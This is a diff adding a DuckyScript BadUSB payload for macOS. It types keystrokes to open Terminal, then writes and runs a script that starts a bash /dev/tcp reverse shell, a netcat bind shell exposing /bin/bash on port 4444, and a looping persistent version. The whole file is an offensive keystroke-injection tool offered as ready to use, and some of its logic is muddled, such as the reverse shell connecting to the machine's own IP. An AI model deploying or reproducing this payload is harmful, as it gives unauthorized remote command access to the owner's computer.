@@ -1,0 +1,50 @@
+REM Title: macOS Reverse Shell via Netcat
+REM Author: BadUSB Library
+REM Description: Creates reverse shell connection using netcat
+REM Target: macOS 10.15+
+REM Category: Command & Control
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create reverse shell script
+STRING cat > /tmp/reverse_shell.sh << 'EOF'
+#!/bin/bash
+
+# Get local IP for connection
+LOCAL_IP=$(ifconfig | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}' | head -1)
+
+echo "Creating reverse shell..."
+echo "Local IP: $LOCAL_IP"
+echo "Connect with: nc -l -p 4444"
+
+# Create reverse shell
+bash -i >& /dev/tcp/$LOCAL_IP/4444 0>&1 &
+
+# Alternative netcat method
+nc -l -p 4444 -e /bin/bash &
+
+# Also create a persistent version
+while true; do
+    nc -l -p 4444 -e /bin/bash
+    sleep 5
+done &
+
+EOF
+ENTER
+
+REM Make executable and run
+STRING chmod +x /tmp/reverse_shell.sh
+ENTER
+STRING /tmp/reverse_shell.sh
+ENTER
+
+REM Also create a simple netcat listener
+STRING nc -l -p 4444
+ENTER
